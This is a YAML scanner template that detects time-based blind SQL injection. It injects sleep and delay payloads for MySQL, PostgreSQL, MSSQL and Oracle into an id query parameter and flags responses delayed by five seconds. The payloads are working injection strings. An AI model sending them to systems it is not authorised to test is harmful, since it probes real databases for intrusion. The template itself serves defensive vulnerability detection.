metadata:
  id: "sql-injection-time"
  name: "SQL Injection (Time-Based Blind)"
  description: "Detects blind SQL injection by measuring response delays"
  severity: "critical"
  tags: ["sql", "injection", "blind", "time"]

engine: "http"
method: "GET"
path: "/?id=FUZZ"

baseline:
  method: "GET"
  path: "/?id=1"

payloads:
  - name: "mysql-sleep"
    value: "1 AND SLEEP(5)"
  - name: "mysql-sleep-comment"
    value: "1' AND SLEEP(5)--"
  - name: "postgres-sleep"
    value: "1; SELECT pg_sleep(5)"
  - name: "mssql-waitfor"
    value: "1; WAITFOR DELAY '0:0:5'"
  - name: "oracle-sleep"
    value: "1 AND DBMS_LOCK.SLEEP(5)"

matchers:
  - type: "time_based"
    timeout: 5
    condition: "or"
